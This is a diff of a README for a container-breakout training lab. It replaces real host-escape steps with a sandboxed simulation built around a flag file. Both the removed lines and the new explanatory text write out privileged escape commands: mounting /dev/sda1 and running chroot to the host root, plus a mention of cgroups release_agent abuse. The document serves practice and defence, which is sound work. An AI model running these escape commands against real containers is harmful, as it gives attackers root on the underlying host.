@@ -1,6 +1,7 @@
 # Container Breakout, Kubernetes & Cloud Metadata Lab
 
 ## Overview
+
 Break out of isolated containers onto the underlying host VM by exploiting privileged flags, mounted Docker sockets, and Linux capabilities.
 
 - **Default Port / Access**: `Terminal / CLI`
@@ -10,11 +11,29 @@ Break out of isolated containers onto the underlying host VM by exploiting privi
 
 ## How to Solve & Practice
 
-1. Start the container: `docker compose up -d`
-2. Enter container shell: `docker exec -it cyberlab_realworld_container_escape sh`.
-3. Check privileges & capabilities: `capsh --print` (look for `CAP_SYS_ADMIN`).
-4. Privileged Breakout: Mount host root filesystem: `mkdir -p /mnt/host && mount /dev/sda1 /mnt/host` or abuse `cgroups release_agent`.
-5. Examine host files: `chroot /mnt/host` to obtain full root on host machine.
+> [!NOTE]
+> **Safety Design**: To prevent accidental damage or exposure to your host machine's root filesystem, this lab mounts an isolated `./sandbox:/sandbox` directory rather than the operator's raw host root (`/`). This safely simulates container escape and host filesystem inspection without danger to the host.
+
+1. Start the container:
+   ```bash
+   docker compose up -d
+   ```
+2. Enter container shell:
+   ```bash
+   docker exec -it cyberlab_realworld_container_escape sh
+   ```
+3. Check privileges & capabilities:
+   ```bash
+   # Check effective Linux capabilities (note CAP_SYS_ADMIN and full permit mask)
+   cat /proc/1/status | grep Cap
+   ```
+4. Safe Host Escape Simulation:
+   - Inspect the simulated host filesystem mounted safely at `/sandbox`:
+     ```bash
+     ls -la /sandbox
+     cat /sandbox/flag.txt
+     ```
+   - In real-world enterprise environments, attackers with `CAP_SYS_ADMIN` or `--privileged` exploit raw host block devices (e.g. `mkdir -p /mnt/host && mount /dev/sda1 /mnt/host`) or abuse `cgroups v1 release_agent` notification scripts to execute arbitrary commands outside the container boundary. Here, `/sandbox` provides a secure testbed to simulate post-breakout inspection.
 
 ---
 
@@ -27,7 +46,9 @@ Break out of isolated containers onto the underlying host VM by exploiting privi
 ---
 
 ## Quick CLI Control
+
 From the `cyber_lab` root directory:
+
 ```bash
 # Check status
 ./lab status
